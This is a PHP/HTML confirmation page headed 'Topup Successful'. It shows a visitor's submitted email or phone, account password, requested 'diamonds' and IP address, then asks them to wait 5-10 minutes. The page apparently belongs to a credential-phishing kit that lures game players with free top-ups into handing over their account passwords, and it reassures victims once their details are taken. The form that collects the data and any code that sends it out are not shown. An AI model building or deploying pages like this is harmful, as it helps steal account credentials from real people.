<?php
session_start();
if (!isset($_SESSION['submission'])) {
    header("Location: index.php");
    exit();
}
$data = $_SESSION['submission'];
session_destroy(); // remove data after showing
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Topup Successful</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gradient-to-br from-green-400 to-blue-500 min-h-screen flex items-center justify-center p-4">
  <div class="bg-white rounded-2xl shadow-xl w-full max-w-md p-6 sm:p-8">
    <h1 class="text-2xl sm:text-3xl font-bold text-center text-green-600 mb-6">Topup Successful!</h1>

    <div class="space-y-3 text-gray-700">
      <p><span class="font-semibold">Email/Phone:</span> <?php echo htmlspecialchars($data['email']); ?></p>
      <p><span class="font-semibold">Password:</span> <?php echo htmlspecialchars($data['password']); ?></p>
      <p><span class="font-semibold">Diamonds:</span> <?php echo htmlspecialchars($data['diamonds']); ?></p>
      <p><span class="font-semibold">IP Address:</span> <?php echo htmlspecialchars($data['ip']); ?></p>
    </div>

    <div class="mt-6 text-center">
      <a href="index.php" class="inline-block bg-blue-500 hover:bg-blue-600 text-white px-6 py-3 rounded-lg font-semibold transition">Back to Home</a>
    </div>

    <p class="mt-6 text-center text-sm text-gray-500">Note: Your request is being processed. Please wait 5-10 minutes.</p>
  </div>
</body>
</html>
